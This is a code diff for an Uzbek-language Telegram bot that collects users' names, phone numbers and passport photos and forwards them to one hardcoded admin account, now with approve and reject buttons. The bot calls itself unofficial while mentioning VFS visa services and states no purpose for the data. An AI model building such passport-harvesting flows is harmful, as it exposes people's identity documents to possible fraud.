@@ -12,7 +12,7 @@ from aiogram.utils import executor
 # CONFIG
 # =====================
 BOT_TOKEN = os.getenv("BOT_TOKEN")
-ADMIN_ID = 123456789  # 🔴 BU YERGA O'Z TELEGRAM ID INGIZNI QO'YING
+ADMIN_ID = 5266262372  # ✅ SIZNING TELEGRAM ID
 
 if not BOT_TOKEN:
     print("❌ BOT_TOKEN topilmadi")
@@ -24,18 +24,18 @@ dp = Dispatcher(bot)
 # =====================
 # STORAGE
 # =====================
-user_data = {}
+user_data = {}  # user_id -> dict
 
 # =====================
-# /START
+# START
 # =====================
 @dp.message_handler(commands=["start"])
 async def start(message: types.Message):
     text = (
         "🔐 *XAVFSIZLIK VA FOYDALANISH QOIDALARI*\n\n"
-        "• Bot rasmiy tizim emas\n"
-        "• Ma’lumotlar tekshiruv uchun olinadi\n"
-        "• Noto‘g‘ri ma’lumot javobgarligi foydalanuvchida\n\n"
+        "• Bot rasmiy davlat yoki VFS tizimi emas\n"
+        "• Login/parol so‘ramaydi\n"
+        "• Ma’lumotlar tekshiruv uchun olinadi\n\n"
         "Davom etish uchun rozilik bildiring 👇"
     )
 
@@ -53,7 +53,7 @@ async def start(message: types.Message):
 @dp.callback_query_handler(lambda c: c.data == "agree")
 async def agree(callback: types.CallbackQuery):
     uid = callback.from_user.id
-    user_data[uid] = {"step": "first_name"}
+    user_data[uid] = {"step": "first_name", "approved": False}
     await callback.message.answer("✍️ Ismingizni kiriting:")
     await callback.answer()
 
@@ -101,7 +101,6 @@ async def handle_contact(message: types.Message):
     uid = message.from_user.id
     if uid not in user_data:
         return
-
     if user_data[uid].get("step") != "phone":
         return
 
@@ -123,7 +122,6 @@ async def handle_passport(message: types.Message):
     uid = message.from_user.id
     if uid not in user_data:
         return
-
     if user_data[uid].get("step") != "passport":
         return
 
@@ -133,33 +131,77 @@ async def handle_passport(message: types.Message):
         return
 
     user_data[uid]["passport"] = photo.file_id
-    user_data[uid]["step"] = "done"
+    user_data[uid]["step"] = "waiting"
 
-    # =====================
-    # SEND TO ADMIN
-    # =====================
     data = user_data[uid]
 
+    # ===== ADMIN MESSAGE =====
     admin_text = (
-        "🆕 *YANGI RO‘YXATDAN O‘TISH*\n\n"
+        "🆕 *YANGI FOYDALANUVCHI*\n\n"
         f"👤 Ism: {data['first_name']}\n"
         f"👤 Familiya: {data['last_name']}\n"
         f"📞 Telefon: {data['phone']}\n"
         f"🆔 Telegram ID: {uid}"
     )
 
-    await bot.send_message(ADMIN_ID, admin_text, parse_mode="Markdown")
+    kb = InlineKeyboardMarkup()
+    kb.add(
+        InlineKeyboardButton("✅ Tasdiqlash", callback_data=f"approve:{uid}"),
+        InlineKeyboardButton("❌ Rad etish", callback_data=f"reject:{uid}")
+    )
+
+    await bot.send_message(ADMIN_ID, admin_text, parse_mode="Markdown", reply_markup=kb)
     await bot.send_photo(ADMIN_ID, data["passport"], caption="🛂 Pasport nusxasi")
 
-    # =====================
-    # USER CONFIRMATION
-    # =====================
     await message.answer(
-        "✅ *Ma’lumotlaringiz qabul qilindi!*\n\n"
-        "Admin tomonidan tekshiruvdan so‘ng sizga xabar beriladi.",
+        "⏳ *Ma’lumotlaringiz admin tomonidan tekshirilmoqda.*\n\n"
+        "Tasdiqlangach, sizga xabar beriladi.",
+        parse_mode="Markdown"
+    )
+
+# =====================
+# ADMIN ACTIONS
+# =====================
+@dp.callback_query_handler(lambda c: c.data.startswith("approve:"))
+async def approve_user(callback: types.CallbackQuery):
+    if callback.from_user.id != ADMIN_ID:
+        return
+
+    uid = int(callback.data.split(":")[1])
+    if uid not in user_data:
+        return
+
+    user_data[uid]["approved"] = True
+    user_data[uid]["step"] = "done"
+
+    await bot.send_message(
+        uid,
+        "✅ *Admin tomonidan tasdiqlandingiz!*\n\n"
+        "Endi bot menyusidan foydalanishingiz mumkin.",
         parse_mode="Markdown",
         reply_markup=main_menu()
     )
+
+    await callback.message.edit_text("✅ Foydalanuvchi tasdiqlandi")
+    await callback.answer()
+
+@dp.callback_query_handler(lambda c: c.data.startswith("reject:"))
+async def reject_user(callback: types.CallbackQuery):
+    if callback.from_user.id != ADMIN_ID:
+        return
+
+    uid = int(callback.data.split(":")[1])
+    user_data.pop(uid, None)
+
+    await bot.send_message(
+        uid,
+        "❌ *Admin tomonidan rad etildingiz.*\n\n"
+        "Ma’lumotlaringizni qayta tekshirib /start orqali qayta urinib ko‘ring.",
+        parse_mode="Markdown"
+    )
+
+    await callback.message.edit_text("❌ Foydalanuvchi rad etildi")
+    await callback.answer()
 
 # =====================
 # MENU
@@ -174,13 +216,6 @@ def main_menu():
     )
     kb.add(InlineKeyboardButton("⚙️ Yordam", callback_data="help"))
     return kb
-
-# =====================
-# ADMIN ID COMMAND
-# =====================
-@dp.message_handler(commands=["id"])
-async def get_id(message: types.Message):
-    await message.answer(f"Sizning Telegram ID: `{message.from_user.id}`", parse_mode="Markdown")
 
 # =====================
 # RUN
